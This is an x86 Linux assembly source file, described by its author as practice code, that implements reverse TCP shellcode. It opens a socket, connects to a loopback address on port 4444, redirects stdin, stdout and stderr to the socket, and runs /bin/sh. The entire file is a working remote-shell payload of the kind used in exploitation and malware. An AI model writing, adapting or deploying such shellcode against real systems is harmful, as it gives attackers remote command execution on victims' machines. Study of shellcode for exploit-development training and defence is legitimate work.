; rev tcp shellcode 
; just a practice code ...
; by @5mukx

; x86 linux reverse tcp shellcode

section .text
    global _start

_start:
    ; first create Socket
    ; socketcall(SYS_SOCKET, {AF_INET, SOCK_STREAM, 0})
    xor  eax, eax      ; Clear eax
    mov  al, 0x66      ; sys_socketcall (102)
    xor  ebx, ebx      ; Clear ebx
    inc  ebx           ; SYS_SOCKET (1)
    xor  edx, edx      ; Clear edx (protocol = 0)
    push edx           ; IPPROTO_IP (0)
    push ebx           ; SOCK_STREAM (1)
    push 0x2           ; AF_INET (2)
    mov  ecx, esp      ; Point ecx to args
    int  0x80          ; Call kernel
    mov  edi, eax      ; Save socket fd in edi

    ; lets connect to the host 
    ; socketcall(SYS_CONNECT, {sockfd, sockaddr, addrlen})
    mov  al, 0x66       ; sys_socketcall (102)
    mov  bl, 0x3        ; SYS_CONNECT (3)
    push 0x0101017f     ; addr = 127.1.1.1 [network byte order]
    push word 0x5c11    ; port = 4444 [network byte order]
    push word 0x2       ; sin_family = AF_INET
    mov  ecx, esp       ; sockaddr ptr
    push 0x10           ; addrlen = 16
    push ecx            ; sockaddr
    push edi            ; sockfd (fixed from esi)
    mov  ecx, esp       ; args ptr
    int  0x80           ; Call kernel



    ; duplicate the socket stdin/stdout/stderr
    ; dup2(sockfd, {2, 1, 0})
    mov  ebx, edi      ; sockfd to ebx
    xor  ecx, ecx      ; Clear ecx (newfd = 0)
    mov  cl, 0x2       ; Loop counter (2, 1, 0)

dup_loop:
    mov  al, 0x3f      ; sys_dup2 (63)
    int  0x80          ; Call kernel
    dec  ecx           ; Next fd (1, 0)
    jns  dup_loop      ; Loop until ecx = -1

    ; execute -> /bin/sh
    ; execve("/bin/sh", NULL, NULL)
    xor  eax, eax      ; Clear eax
    mov  al, 0x0b      ; sys_execve (11)
    push edx           ; Null terminator
    push 0x68732f2f    ; "hs//"
    push 0x6e69622f    ; "nib/"
    mov  ebx, esp      ; filename = "/bin/sh"
    xor  ecx, ecx      ; argv = NULL
    xor  edx, edx      ; envp = NULL
    int  0x80          ; call kernel
